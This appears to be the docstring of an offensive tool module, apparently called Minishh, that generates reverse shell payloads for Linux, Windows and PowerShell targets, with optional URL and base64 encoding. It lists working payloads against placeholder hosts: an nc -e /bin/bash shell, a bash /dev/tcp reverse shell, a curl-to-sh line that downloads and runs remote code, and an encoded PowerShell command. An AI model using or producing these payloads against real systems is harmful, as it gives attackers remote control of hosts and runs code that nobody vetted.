"""
Generate a payload for a target with encoding if necessary

```python
>>> from utils.generator import *

>>> payload = PayloadBuilder.build_for("linux").with_ip(<IP>).with_port(<PORT>).using_template(0)
>>> print(payload.get_reverse_shell())
```

Usage in the Minishh shell:

### Command format
> generate <TARGET: linux|windows|powershell> -e <ENCODERS (optional): url|base64|base64ps> -t <TEMPLATE (optional): 0|..int> -o <OUTPUT: show|infile>

### Chain encoders
> generate linux -e url -e base64 -t 1 -o show
nc -e %2Fbin%2Fbash <IP> <PORT>

### Generate some reverse shell payload through minishh
> generate linux show
bash -c "bash -i >& /dev/tcp/<IP>/<PORT> >& 1"

> generate linux infile
curl -s http://<SOME_IP>:<HTTP_PORT>/<RANDOM_ROUTE> | sh

> generate windows urlencode
powershell -nop -e AAA...b56==
"""
